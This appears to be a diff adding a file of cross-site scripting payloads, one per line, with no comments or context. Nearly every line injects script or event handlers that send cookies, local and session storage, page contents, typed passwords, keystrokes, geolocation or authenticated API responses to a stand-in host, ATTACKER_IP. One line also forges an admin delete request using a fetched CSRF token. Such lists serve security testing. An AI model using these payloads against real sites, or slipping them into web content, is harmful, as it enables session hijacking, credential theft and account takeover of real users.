@@ -1,0 +1,46 @@
+<script>alert(document.cookie)</script>
+<script>document.location='http://ATTACKER_IP/steal?c='+document.cookie</script>
+<script>fetch('http://ATTACKER_IP/steal?c='+btoa(document.cookie))</script>
+<script>new Image().src='http://ATTACKER_IP/steal?c='+document.cookie</script>
+<img src=x onerror="fetch('http://ATTACKER_IP/steal?c='+document.cookie)">
+<img src=x onerror="new Image().src='http://ATTACKER_IP/steal?c='+document.cookie">
+<svg onload="fetch('http://ATTACKER_IP/steal?c='+document.cookie)">
+<body onload="fetch('http://ATTACKER_IP/steal?c='+document.cookie)">
+<script>var i=new Image();i.src='http://ATTACKER_IP/steal?c='+document.cookie;</script>
+<script>document.write('<img src="http://ATTACKER_IP/steal?c='+document.cookie+'">')</script>
+<script>var xhr=new XMLHttpRequest();xhr.open('GET','http://ATTACKER_IP/steal?c='+document.cookie);xhr.send();</script>
+<script>fetch('http://ATTACKER_IP/steal',{method:'POST',body:document.cookie})</script>
+<script>navigator.sendBeacon('http://ATTACKER_IP/steal',document.cookie)</script>
+<script>window.location='http://ATTACKER_IP/steal?c='+document.cookie</script>
+<script>window.location.replace('http://ATTACKER_IP/steal?c='+document.cookie)</script>
+<script>history.pushState(null,'','http://ATTACKER_IP/steal?c='+document.cookie)</script>
+<script>document.body.innerHTML='<form action=http://ATTACKER_IP/steal method=POST><input name=c value='+document.cookie+'><input type=submit></form>'</script>
+<script>alert(document.cookie)</script>
+<script>alert(localStorage.getItem('token'))</script>
+<script>alert(sessionStorage.getItem('session'))</script>
+<script>alert(localStorage)</script>
+<script>alert(Object.keys(localStorage))</script>
+<script>var x={};for(var k in localStorage){x[k]=localStorage.getItem(k)};new Image().src='http://ATTACKER_IP/steal?d='+btoa(JSON.stringify(x));</script>
+<script>new Image().src='http://ATTACKER_IP/?ls='+btoa(JSON.stringify(localStorage))</script>
+<script>new Image().src='http://ATTACKER_IP/?ss='+btoa(JSON.stringify(sessionStorage))</script>
+<script>document.forms[0].action='http://ATTACKER_IP/steal'</script>
+<script>document.querySelectorAll('form').forEach(f=>f.action='http://ATTACKER_IP/steal')</script>
+<script>document.querySelectorAll('input[type=password]').forEach(i=>{i.addEventListener('change',function(){new Image().src='http://ATTACKER_IP/steal?p='+this.value})})</script>
+<script>document.addEventListener('keypress',function(e){new Image().src='http://ATTACKER_IP/keylog?k='+e.key})</script>
+<script>setInterval(function(){new Image().src='http://ATTACKER_IP/screen?d='+btoa(document.body.innerHTML)},5000)</script>
+<script>fetch('http://ATTACKER_IP/steal?url='+encodeURIComponent(location.href)+'&cookie='+encodeURIComponent(document.cookie))</script>
+<script>navigator.geolocation&&navigator.geolocation.getCurrentPosition(function(p){new Image().src='http://ATTACKER_IP/geo?lat='+p.coords.latitude+'&lng='+p.coords.longitude})</script>
+<script>new Image().src='http://ATTACKER_IP/?r='+encodeURIComponent(document.referrer)</script>
+<script>new Image().src='http://ATTACKER_IP/?u='+encodeURIComponent(document.URL)</script>
+<script>fetch('http://ATTACKER_IP/?html='+btoa(document.documentElement.outerHTML))</script>
+<script>fetch('/api/admin/users').then(r=>r.text()).then(d=>new Image().src='http://ATTACKER_IP/?d='+btoa(d))</script>
+<script>fetch('/api/profile',{credentials:'include'}).then(r=>r.json()).then(d=>new Image().src='http://ATTACKER_IP/?d='+btoa(JSON.stringify(d)))</script>
+<script>fetch('/api/settings').then(r=>r.text()).then(d=>new Image().src='http://ATTACKER_IP/?d='+btoa(d))</script>
+<script>fetch('/api/keys').then(r=>r.text()).then(d=>fetch('http://ATTACKER_IP/?d='+btoa(d)))</script>
+<script>fetch('/admin').then(r=>r.text()).then(d=>new Image().src='http://ATTACKER_IP/?admin='+btoa(d))</script>
+<script>fetch('/api/csrf').then(r=>r.json()).then(d=>fetch('/api/admin/action',{method:'POST',headers:{'X-CSRF-Token':d.token},body:JSON.stringify({action:'delete'})}))</script>
+<script>fetch('http://ATTACKER_IP/beacon');</script>
+<script>document.title=document.cookie</script>
+<script>console.log(document.cookie)</script>
+<img src=x onerror=alert(document.cookie)>
+<img src=x onerror="document.location='http://ATTACKER_IP/steal?c='+document.cookie">
